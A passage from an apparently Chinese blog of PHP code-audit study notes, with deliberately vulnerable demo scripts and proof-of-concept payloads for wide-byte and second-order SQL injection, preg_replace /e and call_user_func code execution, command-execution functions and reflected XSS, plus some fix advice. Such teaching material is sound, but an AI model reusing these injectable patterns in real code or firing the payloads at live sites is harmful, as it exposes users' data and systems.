class="keyword">die</span>(<span class="string">&#x27;执行失败&#x27;</span>.mysql_errno());<span class="comment">#执行sql语句</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">        <span class="variable">$db_username</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$db_password</span> = <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    &#125;<span class="comment">#拿到数据库的结果整理</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$db_password</span> == <span class="variable">$password</span> &amp;&amp; <span class="variable">$db_username</span> = <span class="variable">$username</span>)&#123;<span class="comment">#对比数据</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;成功&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的用户名就存在万能密码注入，<code>or 1=1</code></p>
<h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827131024547.png" alt="image-20220827131024547"></p>
<h1 id="宽字节注入和二次注入"><a href="#宽字节注入和二次注入" class="headerlink" title="宽字节注入和二次注入"></a>宽字节注入和二次注入</h1><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>intval()#是强制转换类型，强制将其中的内容转换成整型。常用于数字型</p>
<p>add#函数在指定的预定义<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6/4768913">字符</a>前添加<a href="https://baike.baidu.com/item/%E5%8F%8D%E6%96%9C%E6%9D%A0/10132050">反斜杠</a>。这些字符是单引号（’）、双引号（”）、反斜线（\）与NUL（NULL字符）。</p>
<p>而宽字节注入的思路就是，单引号逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为%df的关系，\的编码%5c被吃掉了，也就失去了转义的效果，直接被带入到mysql中，然后mysql在解读时无视了%a0%5c形成的新字节，那么单引号便重新发挥了效果</span><br><span class="line"></span><br><span class="line">常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS</span><br><span class="line"></span><br><span class="line">如果数据库使用的的是GBK编码而PHP编码为UTF8就可能出现注入问题，原因是程序员为了防止SQL注入，就会调用我们上面所介绍的几种函数，将单引号或双引号进行转义操作，转义无非便是在单或双引号前加上斜杠（\）进行转义 ，但这样并非安全，因为数据库使用的是宽字节编码，两个连在一起的字符会被当做是一个汉字，而在PHP使用的UTF8编码则认为是两个独立的字符，如果我们在单或双引号前添加一个字符，使其和斜杠（\）组合被当作一个汉字，从而保留单或双引号，使其发挥应用的作用。但添加的字符的Ascii要大于128，两个字符才能组合成汉字 ，因为前一个ascii码要大于128，才到汉字的范围 ，这一点需要注意。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827133732973.png" alt="image-20220827133732973"></p>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;127.0.0.1:3306&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&#x27;test&#x27;</span>,<span class="variable">$conn</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;GBK&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ID&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;USERNAME&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;PASSWORD&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;PHONE&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827135455087.png" alt="image-20220827135455087"></p>
<p>成功宽字节注入（payload <code>1%20%df%27%20union%20select%201,database(),3,4%20--+</code></p>
<p>修复建议：</p>
<p>使用<code>mysql_ser_charset(GBK)</code>指定字符集</p>
<p>使用<code>mysql_real_escape_string</code>进行转义</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二阶注入：</span><br><span class="line">1.攻击者在http请求中提交恶意输入(输入的时候过滤了，但是进入数据库的时候还原了)</span><br><span class="line">2.恶意输入保存在数据库中</span><br><span class="line">3.攻击者提交第二次http请求</span><br><span class="line">4.未处理第二次http请求，程序在检索存储在数据库中的恶意输入，构造sql语句</span><br><span class="line">5.如果攻击成功，在第二次请求响应中返回结果</span><br></pre></td></tr></table></figure>

<h3 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h3><p>reg.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$username</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$password</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]);</span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    mysql_select_db(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO user(id,username,password,phone) VALUES(&#x27;<span class="subst">$id</span>&#x27;,&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$phone</span>&#x27;);&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;失败&quot;</span>.mysql_error());</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;注册失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;not&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;reg.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    id:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    username:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    password:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    phone:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;phone&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;点击提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>search.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    mysql_select_db(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;失败1&quot;</span>.mysql_error());</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM USER WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;失败2&quot;</span>.mysql_error());</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ID:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;USERNAME:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;PASSWORD:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;PHONE:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;search.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    search ID:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;点击搜索&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们的payload就可以在username那里加上<code>&#39;union select 1,2,database(),4;#</code></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827151005452.png" alt="image-20220827151005452"></p>
<p>再查询0</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827151016017.png" alt="image-20220827151016017"></p>
<p>但是为什么感觉就是再讲漏洞原理啊喂(#`O′)</p>
<p>思路：先将注入语句插入到数据库，注册、留言板等功能都具有insert数据库的操作，然后再使用update的地方触发插入到数据库的注入语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值&#x27;union select ......#</span><br></pre></td></tr></table></figure>

<h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路：</span><br><span class="line">用户能够控制函数输入</span><br><span class="line">存在可执行代码的危险函数</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827151921288.png" alt="image-20220827151921288"></p>
<h2 id="常见的一些函数"><a href="#常见的一些函数" class="headerlink" title="常见的一些函数"></a>常见的一些函数</h2><p>eval()和assert()函数就不说了，直接把中间的参数当做php代码执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回调函数：</span><br><span class="line">mixed call_user_func(callble $callback[,mixed $parameter[,mixed $...]])</span><br><span class="line">$callback是要调用自定义的函数名称</span><br><span class="line">$parameter是自定义函数的参数</span><br><span class="line">call_user_func — 把第一个参数作为回调函数调用 第二个参数当做回调函数的参数</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827165236507.png" alt="image-20220827165236507"></p>
<p>常见的回调函数：</p>
<p>call_user_func(),call_user_func_array(),array_map()等</p>
<p>这里不全，后面我自己会补充。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">动态执行函数</span><br><span class="line">1.定义一个函数</span><br><span class="line">2.将函数名（字符串）赋值给一个变量</span><br><span class="line">3.使用变量名代替函数名调用动态执行函数</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);#简单例子</span><br><span class="line">感觉就和免杀才开始那种一样，a做函数名，b做函数参数。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace函数</span><br><span class="line"></span><br><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line"></span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</span><br></pre></td></tr></table></figure>

<p>一般$pattern是正则</p>
<p>$pattern存在/e模式修正符修饰 允许代码执行,下面是其他修正符的含义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个</span><br><span class="line">2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同</span><br><span class="line">3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号</span><br><span class="line">4、/s 与/m相对，单行模式匹配。</span><br><span class="line">5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。</span><br><span class="line">6、/x 忽略空白模式。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中</span><br><span class="line">，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，</span><br><span class="line">最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的</span><br><span class="line">一位或两位十进制数。</span><br></pre></td></tr></table></figure>

<p>这里举一个简单的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&lt;php&gt;phpinfo()&lt;/php&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">preg_replace(<span class="string">&quot;/&lt;php&gt;(.*?)<span class="subst">$cmd</span>&quot;</span>,<span class="string">&quot;\\1&quot;</span>,<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>

<p>上面的意思大概就是，从str中匹配前面有<code>&lt;php&gt;</code>的后面条件自己设定的字符，用//1来进行替换,但是我们又是/e模式，执行了第二个语句，那么就成功rce。</p>
<p>我们这里的payload就可这样<code>&lt;\/php&gt;/e</code>因为如果有特殊符号要转义，所以前面有个斜杠，匹配成功之后，就会被//1引用，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修复方案</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">使用自定义函数或函数库来代替外部应用程序或命令的应用</span><br><span class="line">使用escappeshellarg函数来处理命令的参数</span><br><span class="line">使用safe_mode_exec_dir来指定可执行的文件路径</span><br><span class="line">将执行函数的参数做白名单限制，在代码或配置文件中限制某些参数</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Reme_mber/article/details/124185032">(96条消息) php preg_replace /e 模式 漏洞分析_quan9i的博客-CSDN博客_preg_replace漏洞</a></p>
<p>这篇文章感觉不错，我搬运过来</p>
<h2 id="preg-replace详解"><a href="#preg-replace详解" class="headerlink" title="preg_replace详解"></a>preg_replace详解</h2><p>/e在php5.5的时候就被废弃</p>
<p>第一个案例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&quot;/s*(.*)s*/ies&quot;</span>, <span class="string">&quot;\\1&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>那么我们可以看出其大致含义就是匹配出的任意内容，都用()包含起来，作为子字符串，存在缓冲区，\1是访问括号内的内容，此时我们上面那个代码，我们就可以构造如下payload进行rce</p>
<p>对于payload中${}的解释，它这里其实是一个可变变量<br><a href="https://www.php.net/manual/zh/language.variables.variable.php">https://www.php.net/manual/zh/language.variables.variable.php</a><br>我们输入了${phpinfo()}，那么它呢因为被括号包裹了，就会存进缓冲区，此时他是符合那个过滤函数的，所以要更替为第二个语句，而这里用到了/e，就相当于将第二个语句给执行了，就相当于eval(xx)，第二个语句也就是//1，而//1的含义是${phpinfo()},他这个时候总的语句呢就是eval(${phpinfo()}),这玩意就相当于变量里面套变量，所以我们需要先执行里面的，也就是${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)，此时我们呢再执行这个eval${1},这玩意能正常执行出来，由于我们没有给1赋值，他会给个警告，但是没问题，不影响我们的语句，所以这个时候我们的rce就实现了</p>
<p>第二个案例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">preg_replace(<span class="string">&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;</span>,<span class="string">&#x27;$ret=&quot;\\1&quot;;&#x27;</span>,<span class="variable">$data</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?data=&lt;data&gt;$&#123;phpinfo()&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>分析原因，此时括号内的内容是${phpinfo()}，传到了缓冲区，执行后面语句时会调用，那么后面语句此时就相当于$ret=${phpinfo()}，肯定会先执行phpinfo()，然后呢返回了1，此时语句是$ret=1，加上我们的/e是执行语句的，所以这里执行的就等同于eval($ret=1)；我们本地测试一下输出结果</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827183314670.png" alt="image-20220827183314670">所以，这就是执行报错的原因所在，有没有解决办法呢，当然有，再加个<code>&#123;&#125;</code>，此时执行结果如下</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827183326474.png" alt="image-20220827183326474"></p>
<p>这是为啥呢，我们不妨再来分析一下，此时存入缓冲区的是{${phpinfo()}}，此时由于\1是反向引用，再加上/e，实际的执行语句就是eval($ret={${phpinfo()}})执行过里面之后，得到的就是eval($ret={1}),而里面会当做变量来执行，也就是eval($ret=${1})，此时就执行出来了。</p>
<p>第三个案例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(<span class="string">&quot;/s*(.*)s*/ies&quot;</span>, <span class="string">&quot;test(\\1)&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">*eval(&quot;\$&#123;phpinfo()&#125;&quot;);</span></span><br><span class="line"><span class="comment">*eval(&quot;test(\&quot;&#123;\$&#123;phpinfo()&#125;&#125;\&quot;);&quot;);</span></span><br><span class="line"><span class="comment">*$&#123;phpinfo()&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload如下</p>
<p>?h=${phpinfo()}</p>
<p>此时执行的就是<code>eval(test($&#123;phpinfo()&#125;)</code>，，而后为<code>eval(test(1))</code>，里面那个是空的，所以执行结果为空，没有错误，可以正常执行</p>
<h2 id="一些正则"><a href="#一些正则" class="headerlink" title="一些正则"></a>一些正则</h2><p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827170249923.png" alt="image-20220827170249923"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827171538419.png" alt="image-20220827171538419"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827180110497.png" alt="image-20220827180110497"></p>
<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">挖掘思路</span><br><span class="line">用户能够控制函数输入</span><br><span class="line">存在可执行代码的危险函数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类型</span><br><span class="line">代码层过滤不严</span><br><span class="line">系统的漏洞造成命令注入</span><br><span class="line">调用的第三方组件存在代码执行漏洞</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827190243561.png" alt="image-20220827190243561"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system函数 自带回显的，不用输出也可</span><br><span class="line">system(string $command, int &amp;$return_var = ?): string</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passthru函数 也是自带回显</span><br><span class="line">passthru ( string $command [, int &amp;$return_var ] ) : void</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exec函数  不自带回显</span><br><span class="line">exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )；</span><br><span class="line"></span><br><span class="line">$command：表示要执行的命令。</span><br><span class="line"></span><br><span class="line">$output:如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。</span><br><span class="line"></span><br><span class="line">$return_var:如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。</span><br><span class="line"></span><br><span class="line">一般来说，我们只要写第一个参数，也就是$command。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec函数  不自带回显的</span><br><span class="line">string shell_exec(string $cmd)</span><br><span class="line">$cmd 要执行的命令</span><br><span class="line">反引号``则调用此函数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤函数</span><br><span class="line">Escapeshellcmd()</span><br><span class="line">过滤整条命令</span><br><span class="line"></span><br><span class="line">Escapeshellarg()</span><br><span class="line">过滤整个参数</span><br></pre></td></tr></table></figure>

<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">挖掘思路</span><br><span class="line">没有过滤的参数，传入到输出函数中</span><br><span class="line">搜索内容，发表文章，留言，评论回复，资料设置</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反射xss常见场景</span><br><span class="line">将前端获取的内容，直接输出到浏览器页面</span><br><span class="line">将前端获取的内容，直接输出到HTML标签</span><br><span class="line">将前端获取的内容，直接输出到&lt;script&gt;标签</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;<span class="comment">//这就是没有过滤直接输出到浏览器的xss</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = $_GET[&#x27;content&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; value=&quot;&lt;?php echo $content;?&gt;&quot;&gt;</span><br><span class="line">//payload是 123?&gt;&quot;&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;#</span><br><span class="line">//闭合了标签</span><br></pre></td></tr></table></figure>

